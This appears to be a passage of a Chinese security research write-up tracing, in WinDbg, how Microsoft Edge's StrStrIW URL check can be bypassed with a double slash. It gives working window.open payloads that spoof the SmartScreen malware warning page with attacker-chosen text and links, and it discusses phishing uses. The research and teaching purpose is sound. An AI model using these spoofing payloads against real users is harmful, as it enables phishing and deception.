    01 000000d3`14df8df0 00007fff`54fee629 KERNELBASE!StrStrIW+0x54
    02 000000d3`14df8eb0 00007fff`55004e6b edgehtml!Ordinal107+0xc6059
    03 000000d3`14df9f50 00007fff`55007272 edgehtml!Ordinal107+0xdc89b
    04 000000d3`14df9f80 00007fff`55004cae edgehtml!Ordinal107+0xdeca2
开头两个属于内核模块，接下来的三个都来自于EdgeHtml。说得更明白些，edgehtml中的一段代码调用了内核模块/库中的StrStrIW函数，这看上去十分标准。快速地Google一下StrStrIW就能看到MSDN对其的[说明文档](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773439\(v=vs.85\).aspx)。
文档相当清楚，也多亏了栈轨迹我们得知edgehtml调用了该函数。让我们在Edge返回地址下断点来分析到达该点前的代码。（另外，我们还可以使用两次pt命令，即跳至下一返回命令。可以自己试一试！）
    bp edgehtml!Ordinal107+0xc6059
    g
执行后立马停在了断点处：
    Breakpoint 3 hit
    edgehtml!Ordinal107+0xc6059:
    00007fff`54fee629 4885c0 test rax,rax
但我们刚从字符串比较处返回，不妨往回看看究竟发生了什么。在WinDbg中我们可以快速向上反汇编（ub命令）
    0:013> ub $ip
    edgehtml!Ordinal107+0xc602d:
    00007fff`54fee5fd lea rdx,[edgehtml!Ordinal138+0x3e4ff8 (00007fff`55d5e6b8)]
    00007fff`54fee604 lea rcx,[rsp+30h]
    00007fff`54fee609 call qword ptr [edgehtml!Ordinal138+0x38b5b8 (00007fff`55d04c78)]
    00007fff`54fee60f test eax,eax
    00007fff`54fee611 jne edgehtml!Ordinal107+0xc6108 (00007fff`54fee6d8)
    00007fff`54fee617 lea rdx,[edgehtml!Ordinal138+0x417160] (第二个参数)
    00007fff`54fee61e lea rcx,[rsp+30h]                      (第一个参数)
    00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8]
很好。可惜我们没有全部的符号名所以结果看上去有些丑陋。但是不用担心，我们知道我们刚从上一个调用返回（最下面一行处那个调用）。并且在该调用之前传递过两个参数，一个在rdx中另一个在rcx中（那两行lea）。但因为call已经执行过了所以目前我们不知道那两个参数是什么，而且这两个参数的值可能是可以被更改的。让我们在最近的一个调用下断点（这样它就不会被执行）做进一步检查，并且一旦我们到达断点就检查其中的参数：
    bd * (取消之前的断点)
    bp 00007fff`54fee623
    g
现在我们将有机会查看在进行字符串比较之前究竟发生了什么。运行之前的JavaScript命令可以来到断点的位置。
    Breakpoint 4 hit
    edgehtml!Ordinal107+0xc6053:
    00007fff`54fee623 call qword ptr [edgehtml!Ordinal138+0x38b5c8] ds:00007fff`55d04c88={KERNELBASE!StrStrIW (00007fff`74f701f0)}
我们调查一下传递给StrStrIW函数的参数：
    0:013> du @rcx (First argument)
    000000d3`14df8ee0 "ms-appx-web://microsoft.microsof"
    000000d3`14df8f20 "tedge/assets/errorpages/BlockSit"
    000000d3`14df8f60 "e.htm?BlockedDomain=facebook.com"
    0:013> du @rdx (Second argument)
    00007fff`55d90820 "/assets/errorPages/BlockSite.htm"
哈！我们看到%2e（句点）已经被解码了。这让我感觉像是Edge调用了StrStrIW函数后检查了“/assets/errorPages/BlockSite.htm”是否包含在URL中。这是我目前相信的伪代码：
    var url = "ms-appx-web://microsoft.microsoftedge/assets/errorpages/BlockSite.htm?BlockedDomain=facebook.com";
    var badString = "/assets/errorPages/BlockSite.htm";
    if (badString is inside URL) ACCESS_DENIED;
我们需要记住的很重要的一点是，之所以要调查这里是因为在字符串比较操作之后我们没有看到别的检查，而且比较操作就在我们面前，很快就将被执行。不过我们不用考虑的太多，只要能够用类似的技术绕过就行了。
最主要的问题在于，此处的比较操作是使用硬编码的字符串来进行的，但我们知道URL可以有很多种方式来写。之前我们的办法就是编码一个句点，这次需要想出一种新的办法，因为打补丁后会在作比较前解码句点从而导致失败。
现在我的脑海中浮现出许多种方式，比如多重编码，或者在URL中加入更多的斜杠。让我们试一试加入一个斜杠，可能能够欺骗字符串检查并被视为一个合法的URL。所以我们在errorPages后面加入一个斜杠，像这样：
    window.open("ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com");
哇！好像一个简单的双斜杠就能绕过补丁并让Edge加载错误页面，让我们构造一个更完善的查询字符串来完全骗过恶意软件警告页面：
    window.open("ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=facebook.com&Host=These guys at Facebook and in particular, Justin Rogers#http://www.facebook.com");
**PoC验证及后话**
PoC链接：
打开后界面如图所示：
使用方式很简单，比如想要执行一个如下的JavaScript命令：
    window.open("ms-appx-web://microsoft.microsoftedge/assets/errorpages//BlockSite.htm?BlockedDomain=http://www.baidu.com&Host=It's not safe,please use https://www.so.com/ instead#http://www.baidu.com");
只需在第一个文本框中输入“http://www.baidu.com”，第二个文本框中输入“It's not safe, please use
https://www.so.com/ instead”，然后点击open smartsceen按钮，就会弹出baidu.com不安全的警告：
试想一下，当普通用户没有防备地点击了遭受攻击的网站中的按钮（比如导航网站的搜索引擎或者银行登录页面），网站弹出一个警告页面并甩出一个新的钓鱼链接，然后用户可能就中招了。
其实最后会发现绕过的方式十分简单，并且十分有效，但发现并找到这一思路的过程值得学习。